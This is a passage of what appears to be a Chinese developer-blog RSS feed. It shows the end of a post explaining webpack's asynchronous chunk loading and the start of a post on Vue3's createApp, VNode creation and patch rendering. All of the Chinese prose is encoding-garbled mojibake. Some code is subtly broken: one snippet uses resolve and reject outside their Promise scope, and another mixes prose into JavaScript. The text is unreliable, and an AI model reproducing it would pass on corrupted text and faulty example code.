<p><code>ä¸ºä»€ä¹ˆ webpack è¦å¤šæ­¤ä¸€ä¸¾ ï¼Ÿä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨ webpackJsonpCallback åŒ…è£¹èµ·æ¥å‘¢?</code></p>
<h4 data-id="heading-12">æ ¸å¿ƒåŸå› ï¼šè§£å†³å¼‚æ­¥åŠ è½½çš„é¡ºåºé—®é¢˜</h4>
<p><strong>åŠ è½½é¡ºåºä¸ç¡®å®šæ€§</strong>ï¼š</p>
<ul>
<li>
<p>å¼‚æ­¥ chunk å¯èƒ½åœ¨ä¸» runtime åŠ è½½å®Œæˆä¹‹å‰å°±åŠ è½½å®Œæ¯•ï¼ˆ<code>å…³é”®ï¼šæ­¤æ—¶webpackJsonpCallback å¯èƒ½è¿˜æ²¡æœ‰å®šä¹‰ï¼Œå› ä¸º webpackJsonpCallback æ˜¯å†™åœ¨ä¸» runtimeé‡Œçš„</code>ï¼‰</p>
</li>
<li>
<p>ä¹Ÿå¯èƒ½åœ¨ä¸» runtime åŠ è½½å®Œæˆä¹‹åæ‰åŠ è½½</p>
</li>
</ul>
<h4 data-id="heading-13">å…³é”®è®¾è®¡ï¼šåŠ«æŒpushæ–¹æ³•</h4>
<p><code>æ­¤æ—¶å°±ç®—æ‰¾ä¸åˆ° webpackJsonpCallbackï¼Œä½†æ˜¯ webpackJsonp.push æ˜¯åŸç”Ÿæ–¹æ³•ï¼Œè‚¯å®šå¯ä»¥æ‰¾åˆ°ï¼Œè¿™æ ·å³ä½¿ webpackJsonpCallback æœªå®šä¹‰ï¼Œä¹Ÿä¸ä¼šè®© å·²åŠ è½½çš„åˆ†å— ä¸¢å¤±</code></p>
<p><code>ä¹Ÿå°±æ˜¯å…è®¸ä»»ä½•æ—¶é—´åŠ è½½çš„åˆ†å—ï¼Œwebpackéƒ½èƒ½å¤„ç†ï¼Œå®Œå…¨è§£è€¦åŠ è½½é¡ºåº</code></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å…³é”®è®¾è®¡ï¼šåŠ«æŒpushæ–¹æ³•</span>
webpackJsonp.<span class="hljs-property">push</span> = webpackJsonpCallback;

<span class="hljs-comment">// å¤„ç†åˆå§‹åŒ–å‰å·²åŠ è½½çš„åˆ†å—</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; webpackJsonp.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-title function_">webpackJsonpCallback</span>(webpackJsonp[i]);
}

webpackJsonp.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// æ¸…ç©ºåˆå§‹é˜Ÿåˆ—</span>

<span class="hljs-comment">// å°†å¤„ç†åçš„é˜Ÿåˆ—æš´éœ²åˆ°å…¨å±€</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-property">webpackJsonp</span> = webpackJsonp;
</code></pre>
<h4 data-id="heading-14">åœºæ™¯1ï¼šåˆ†å—åœ¨ä¸»runtimeä¹‹å‰åŠ è½½å®Œæˆ</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">
sequenceDiagram

participant Browser

participant Chunk as å¼‚æ­¥åˆ†å—

participant Runtime as Webpack Runtime

Browser-&gt;&gt;Chunk: 1. åŠ è½½åˆ†å—æ–‡ä»¶

Chunk-&gt;&gt;Browser: 2. æ‰§è¡Œåˆ†å—ä»£ç 

Note right of Chunk: webpackJsonp.push([[1], modules])

Browser-&gt;&gt;Runtime: 3. åŠ è½½ä¸»runtime

Runtime-&gt;&gt;Runtime: 4. åˆå§‹åŒ–æ—¶é‡å†™pushæ–¹æ³•

Runtime-&gt;&gt;Runtime: 5. å¤„ç†å·²ç¼“å­˜çš„æ¨é€

Runtime-&gt;&gt;Runtime: 6. æ‰§è¡Œå›è°ƒé€»è¾‘

</code></pre>
<h4 data-id="heading-15">åœºæ™¯2ï¼šåˆ†å—åœ¨ä¸»runtimeä¹‹ååŠ è½½å®Œæˆ</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">
sequenceDiagram

participant Browser

participant Runtime as Webpack Runtime

participant Chunk as å¼‚æ­¥åˆ†å—

Browser-&gt;&gt;Runtime: 1. åŠ è½½ä¸»runtime

Runtime-&gt;&gt;Runtime: 2. åˆå§‹åŒ–æ—¶é‡å†™pushæ–¹æ³•

Runtime-&gt;&gt;Runtime: 3. å¤„ç†åˆå§‹é˜Ÿåˆ—(ç©º)

Browser-&gt;&gt;Chunk: 4. åŠ è½½åˆ†å—æ–‡ä»¶

Chunk-&gt;&gt;Browser: 5. æ‰§è¡Œåˆ†å—ä»£ç 

Note right of Chunk: webpackJsonp.push([[1], modules])

Browser-&gt;&gt;Runtime: 6. æ¨é€è§¦å‘å›è°ƒ

</code></pre>
<h2 data-id="heading-16">æ€»æµç¨‹æ¦‚è§ˆ</h2>
<h4 data-id="heading-17">1. <strong>ç¼–è¯‘é˜¶æ®µï¼ˆBuild Timeï¼‰</strong></h4>
<ul>
<li>
<p><strong>è¯­æ³•è¯†åˆ«</strong>ï¼šWebpack è§£æ AST æ—¶è¯†åˆ« <code>import('./LazyComponent')</code> è¯­æ³•</p>
</li>
<li>
<p><strong>æ¨¡å—åˆ†ç¦»</strong>ï¼š</p>
</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript">  <span class="hljs-comment">// åŸå§‹ä»£ç </span>
  <span class="hljs-keyword">import</span>(<span class="hljs-string">'./LazyComponent'</span>);
  
  <span class="hljs-comment">// Webpack å¤„ç†ï¼š</span>
  <span class="hljs-number">1.</span> å°† <span class="hljs-title class_">LazyComponent</span> åŠå…¶ä¾èµ–æŠ½ç¦»ä¸ºç‹¬ç«‹ chunkï¼ˆå¦‚ <span class="hljs-string">`src_LazyComponent_js.js`</span>ï¼‰
  <span class="hljs-number">2.</span> ç”Ÿæˆ chunk <span class="hljs-variable constant_">ID</span>ï¼ˆå¦‚ <span class="hljs-string">"chunk-lazy"</span>ï¼‰
  <span class="hljs-number">3.</span> ç”Ÿæˆæ¨¡å— <span class="hljs-variable constant_">ID</span>ï¼ˆå¦‚ <span class="hljs-number">42</span>ï¼‰
- **ä»£ç è½¬æ¢**ï¼š
  <span class="hljs-string">``</span><span class="hljs-string">`javascript
  // è½¬æ¢åä»£ç 
  __webpack_require__.e("chunk-lazy")
    .then(__webpack_require__.bind(__webpack_require__, 42))
</span></code></pre>
<ul>
<li><strong>ç”Ÿæˆ chunk æ–‡ä»¶</strong>ï¼š</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src_LazyComponent_js.js å†…å®¹</span>
  (<span class="hljs-variable language_">window</span>[<span class="hljs-string">"webpackJsonp"</span>] = <span class="hljs-variable language_">window</span>[<span class="hljs-string">"webpackJsonp"</span>] || []).<span class="hljs-title function_">push</span>([
    [<span class="hljs-string">"chunk-lazy"</span>],
    {
      <span class="hljs-string">"./src/LazyComponent.js"</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-variable language_">module</span>, __webpack_exports__, __webpack_require__</span>) =&gt;</span> {
        <span class="hljs-comment">// æ¨¡å—å®é™…ä»£ç </span>
      }
    }
  ]);
</code></pre>
<h4 data-id="heading-18">2. <strong>è¿è¡Œæ—¶é˜¶æ®µï¼ˆRuntimeï¼‰</strong></h4>
<ul>
<li><strong>è§¦å‘åŠ è½½</strong>ï¼š</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ‰§è¡Œç¼–è¯‘åçš„ä»£ç </span>
<span class="hljs-keyword">const</span> promise = __webpack_require__.<span class="hljs-title function_">e</span>(<span class="hljs-string">"chunk-lazy"</span>);
</code></pre>
<ul>
<li><strong>åŠ è½½å™¨æ‰§è¡Œ</strong>ï¼š</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// __webpack_require__.e æ ¸å¿ƒé€»è¾‘</span>
  __webpack_require__.<span class="hljs-property">e</span> = <span class="hljs-function">(<span class="hljs-params">chunkId</span>) =&gt;</span> {
    <span class="hljs-comment">// æ£€æŸ¥ç¼“å­˜</span>
    <span class="hljs-keyword">if</span> (installedChunks[chunkId] === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>();
    
    <span class="hljs-comment">// åˆ›å»ºåŠ è½½ Promise</span>
    <span class="hljs-keyword">const</span> promise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-comment">// åˆ›å»º script æ ‡ç­¾</span>
      <span class="hljs-keyword">const</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'script'</span>);
      script.<span class="hljs-property">src</span> = <span class="hljs-string">`<span class="hljs-subst">${publicPath}</span><span class="hljs-subst">${chunkId}</span>.chunk.js`</span>;
      
      <span class="hljs-comment">// é”™è¯¯å¤„ç†</span>
      script.<span class="hljs-property">onerror</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Loading failed <span class="hljs-subst">${chunkId}</span>`</span>));
      
      <span class="hljs-comment">// æ³¨å†Œå…¨å±€å›è°ƒ</span>
      <span class="hljs-keyword">const</span> originalPush = webpackJsonp.<span class="hljs-property">push</span>.<span class="hljs-title function_">bind</span>(webpackJsonp);
      webpackJsonp.<span class="hljs-property">push</span> = <span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> {
        <span class="hljs-title function_">webpackJsonpCallback</span>(item);
        <span class="hljs-title function_">originalPush</span>(item);
      };

      <span class="hljs-comment">// å¤„ç†è¿è¡Œæ—¶åˆå§‹åŒ–å‰å·²åŠ è½½çš„æ•°æ®</span>
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; webpackJsonp.<span class="hljs-property">length</span>; i++) {
        <span class="hljs-title function_">webpackJsonpCallback</span>(webpackJsonp[i]);
      }

      <span class="hljs-comment">// æ¸…ç©ºé˜Ÿåˆ—ä½†ä¸ç§»é™¤å¼•ç”¨</span>
      webpackJsonp.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>, webpackJsonp.<span class="hljs-property">length</span>);


      
      <span class="hljs-comment">// è§¦å‘åŠ è½½</span>
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">appendChild</span>(script);
    });
    
    <span class="hljs-comment">// æ ‡è®°ä¸ºåŠ è½½ä¸­</span>
    installedChunks[chunkId] = [promise, resolve, reject];
    <span class="hljs-keyword">return</span> promise;
  };
</code></pre>
<h4 data-id="heading-19">3. <strong>æ¨¡å—æ³¨å†Œé˜¶æ®µï¼ˆChunk Executionï¼‰</strong></h4>
<ul>
<li><strong>Chunk è„šæœ¬æ‰§è¡Œ</strong>ï¼š</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æµè§ˆå™¨åŠ è½½å¹¶æ‰§è¡Œ src_LazyComponent_js.js</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">webpackJsonp</span>.<span class="hljs-title function_">push</span>([
    [<span class="hljs-string">"chunk-lazy"</span>], 
    { 
      <span class="hljs-string">"./src/LazyComponent.js"</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span>, <span class="hljs-built_in">exports</span></span>) {
        <span class="hljs-comment">// ç»„ä»¶å®ç°</span>
        <span class="hljs-built_in">exports</span>.<span class="hljs-property">default</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">LazyComp</span>(<span class="hljs-params"/>) { ... }
      }
    }
  ]);
</code></pre>
<ul>
<li><strong>å›è°ƒè§¦å‘</strong>ï¼š</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">webpackJsonpCallback</span>(<span class="hljs-params">data</span>) {
    <span class="hljs-keyword">const</span> [chunkIds, modules] = data;
    
    <span class="hljs-comment">// 1. æ³¨å†Œæ¨¡å—åˆ°å…¨å±€å­˜å‚¨</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> moduleId <span class="hljs-keyword">in</span> modules) {
      __webpack_modules__[moduleId] = modules[moduleId];
    }
    
    <span class="hljs-comment">// 2. æ ‡è®°chunkä¸ºå·²åŠ è½½</span>
    chunkIds.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">chunkId</span> =&gt;</span> {
      installedChunks[chunkId] = <span class="hljs-number">0</span>; <span class="hljs-comment">// 0 = å·²åŠ è½½</span>
    });
    
    <span class="hljs-comment">// 3. æ‰§è¡Œæ‰€æœ‰ç­‰å¾…ä¸­çš„resolve</span>
    <span class="hljs-keyword">const</span> resolves = [];
    chunkIds.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">chunkId</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (installedChunks[chunkId]) {
        resolves.<span class="hljs-title function_">push</span>(installedChunks[chunkId][<span class="hljs-number">1</span>]); <span class="hljs-comment">// è·å–resolveå‡½æ•°</span>
        installedChunks[chunkId] = <span class="hljs-number">0</span>; <span class="hljs-comment">// æ¸…é™¤ç­‰å¾…çŠ¶æ€</span>
      }
    });
    <span class="hljs-comment">// resolveå¯ä»¥æ§åˆ¶ä½•æ—¶æ‰§è¡Œæ¨¡å—</span>
    <span class="hljs-comment">// æ¯”å¦‚resolveå¯ä»¥æ˜¯() =&gt; {</span>

    <span class="hljs-comment">// æ‰§è¡Œæ¨¡å—åŠ è½½</span>
    <span class="hljs-comment">//const module = __webpack_require__(42);</span>
    <span class="hljs-comment">//return module;</span>
    <span class="hljs-comment">//}</span>
    resolves.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-title function_">resolve</span>());
  }
</code></pre>
<p>è‡³æ­¤ï¼Œwebpackå¼‚æ­¥åŠ è½½åŸç† æˆ‘ä»¬å·²ç»å¤§è‡´æ¸…æ¥šäº†ï¼Œæ˜¯ä¸æ˜¯è¿˜æŒºæœ‰æ„æ€çš„ï¼ŒåŒæ—¶ä¹Ÿèƒ½ç»™æˆ‘ä»¬ä¸€äº›å¯å‘ï¼Œå°¤å…¶ç²¾å¦™è®¾è®¡é‚£é‡Œï¼Œå¸Œæœ›æœ‰æœºä¼šç”¨åˆ°ï¼Œè¿™æ ·æˆ‘ä»¬ä¹Ÿæ˜¯ç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šäº†ï½</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3 åº”ç”¨å®ä¾‹åˆ›å»ºåŠé¡µé¢æ¸²æŸ“åº•å±‚åŸç†]]></title>    <link>https://juejin.cn/post/7590020026395377718</link>    <guid>https://juejin.cn/post/7590020026395377718</guid>    <pubDate>2026-01-02T15:13:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590020026395377718" data-draft-id="7590020026395361334" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3 åº”ç”¨å®ä¾‹åˆ›å»ºåŠé¡µé¢æ¸²æŸ“åº•å±‚åŸç†"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-02T15:13:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç§€ç§€ä¸åªä¼šå‰ç«¯"/> <meta itemprop="url" content="https://juejin.cn/user/1410009035452887"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3 åº”ç”¨å®ä¾‹åˆ›å»ºåŠé¡µé¢æ¸²æŸ“åº•å±‚åŸç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1410009035452887/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç§€ç§€ä¸åªä¼šå‰ç«¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T15:13:42.000Z" title="Fri Jan 02 2026 15:13:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ•´ä½“æµç¨‹</h2>
<p>å®Œæ•´çš„åˆ›å»ºä¸æ¸²æŸ“æµç¨‹å¯ä»¥åˆ†æˆè¿™äº›é˜¶æ®µï¼š</p>
<ol>
<li><strong>åˆ›å»º App å®ä¾‹</strong></li>
<li><strong>åˆ›å»ºæ ¹ç»„ä»¶å®ä¾‹</strong></li>
<li><strong>è®¾ç½®å“åº”å¼çŠ¶æ€</strong></li>
<li><strong>åˆ›å»ºæ¸²æŸ“å™¨ï¼ˆRendererï¼‰</strong></li>
<li><strong>æŒ‚è½½ Mount</strong></li>
<li><strong>vnode -&gt; DOM æ¸²æŸ“</strong></li>
<li><strong>æ•°æ®å˜æ›´è§¦å‘æ›´æ–°</strong></li>
<li><strong>é‡æ–°æ¸²æŸ“ / diff / patch</strong></li>
</ol>
<p>æµç¨‹å›¾å¤§è‡´å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-Plain" lang="Plain">createApp() â”€â”€â”€&gt; app.mount('#app')
         â”‚                 â”‚
         â–¼                 â–¼
   createRootComponent    createRenderer
         â”‚                 â”‚
         â–¼                 â–¼
 setup() / render()   render(vnode) -&gt; patch
         â”‚                 â”‚
         â–¼                 â–¼
   effect(fn) â”€â”€â”€â”€&gt; scheduler -&gt; patch updates
</code></pre>
<h2 data-id="heading-1">1ã€createApp åˆå§‹åŒ–</h2>
<p>Vue åº”ç”¨çš„å…¥å£é€šå¸¸æ˜¯ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>).<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<p>ä»æºç çœ‹ createAppï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// packages/runtime-core/src/apiCreateApp.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createAppAPI</span>(<span class="hljs-params">render</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createApp</span>(<span class="hljs-params">rootComponent, rootProps = <span class="hljs-literal">null</span></span>) {
    <span class="hljs-keyword">const</span> app = {
      <span class="hljs-attr">_component</span>: rootComponent,
      <span class="hljs-attr">_props</span>: rootProps,
      <span class="hljs-attr">_container</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">_context</span>: <span class="hljs-title function_">createAppContext</span>()
    }
    <span class="hljs-keyword">const</span> proxy = (app.<span class="hljs-property">_instance</span> = {
      app
    })
    <span class="hljs-comment">// register global APIs</span>
    <span class="hljs-comment">// ...</span>
    <span class="hljs-keyword">return</span> {
      <span class="hljs-title function_">mount</span>(<span class="hljs-params">container</span>) {
        <span class="hljs-keyword">const</span> vnode = <span class="hljs-title function_">createVNode</span>(rootComponent, rootProps)
        app.<span class="hljs-property">_container</span> = container
        <span class="hljs-title function_">render</span>(vnode, container)
      },
      <span class="hljs-title function_">unmount</span>(<span class="hljs-params"/>) { <span class="hljs-comment">/* ... */</span> }
    }
  }
}
</code></pre>
<p>å…³é”®ç‚¹ï¼š</p>
<ul>
<li><code>createAppAPI(render)</code> ç”Ÿæˆ createApp å‡½æ•°</li>
<li>app å†…ä¿å­˜ <code>_component</code>ã€ä¸Šä¸‹æ–‡ <code>_context</code></li>
<li><code>app.mount</code> è°ƒç”¨ <code>render(vnode, container)</code></li>
</ul>
<p><code>render</code> ç”± <strong>å¹³å°æ¸²æŸ“å™¨</strong> æ³¨å…¥ï¼ˆåœ¨ web ä¸‹æ˜¯ DOM æ¸²æŸ“å™¨ï¼‰ã€‚</p>
<h2 data-id="heading-2">2ã€createVNode åˆ›å»ºè™šæ‹ŸèŠ‚ç‚¹ï¼ˆVNodeï¼‰</h2>
<p>åœ¨ mount å‰ä¼šåˆ›å»ºä¸€ä¸ªè™šæ‹ŸèŠ‚ç‚¹ï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createVNode</span>(<span class="hljs-params"><span class="hljs-keyword">type</span>, props, children</span>) {
  <span class="hljs-keyword">const</span> vnode = {
    <span class="hljs-keyword">type</span>,
    props,
    children,
    <span class="hljs-attr">shapeFlag</span>: <span class="hljs-title function_">getShapeFlag</span>(<span class="hljs-keyword">type</span>),
    <span class="hljs-attr">el</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">key</span>: props &amp;&amp; props.<span class="hljs-property">key</span>
  }
  <span class="hljs-keyword">return</span> vnode
}
</code></pre>
<p><code>vnode</code> æ˜¯æ¸²æŸ“çš„åŸºç¡€å•å…ƒï¼š</p>
<p><code>shapeFlag</code> ç”¨æ¥å¿«é€Ÿåˆ¤æ–­ vnode ç±»å‹ï¼Œæ˜¯å†…éƒ¨æ€§èƒ½ä¼˜åŒ–ã€‚</p>
<h2 data-id="heading-3">3ã€æ¸²æŸ“å™¨ Renderer åˆå§‹åŒ–</h2>
<p>Vue3 æ˜¯å¹³å°æ— å…³çš„ï¼ˆruntime-coreï¼‰ï¼ŒçœŸæ­£ä¾èµ– DOM çš„æ˜¯åœ¨ <strong>runtime-dom</strong> ä¸­ã€‚</p>
<p>åˆ›å»º Rendererï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> renderer = <span class="hljs-title function_">createRenderer</span>({
  <span class="hljs-attr">createElement</span>: hostCreateElement,
  <span class="hljs-attr">patchProp</span>: hostPatchProp,
  <span class="hljs-attr">insert</span>: hostInsert,
  <span class="hljs-attr">remove</span>: hostRemove,
  <span class="hljs-attr">setElementText</span>: hostSetElementText
})
</code></pre>
<p><code>createRenderer</code> è¿”å›äº†æˆ‘ä»¬å‰é¢åœ¨ createApp ä¸­ä½¿ç”¨çš„ <code>render(vnode, container)</code> å‡½æ•°ã€‚</p>
<h2 data-id="heading-4">4ã€render &amp; patch</h2>
<p>æ ¸å¿ƒæ¸²æŸ“å…¥å£ï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">vnode, container</span>) {
  <span class="hljs-title function_">patch</span>(<span class="hljs-literal">null</span>, vnode, container, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)
}
</code></pre>
<p>patch æ˜¯æ¸²æŸ“è¡¥ä¸å‡½æ•°ï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">patch</span>(<span class="hljs-params">n1, n2, container, parentComponent, anchor</span>) {
  <span class="hljs-keyword">const</span> { <span class="hljs-keyword">type</span>, shapeFlag } = n2
  <span class="hljs-keyword">if</span> (shapeFlag &amp; <span class="hljs-title class_">ShapeFlags</span>.<span class="hljs-property">ELEMENT</span>) {
    <span class="hljs-title function_">processElement</span>()
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (shapeFlag &amp; <span class="hljs-title class_">ShapeFlags</span>.<span class="hljs-property">STATEFUL_COMPONENT</span>) {
    <span class="hljs-title function_">processComponent</span>(...)
  }
}
</code></pre>
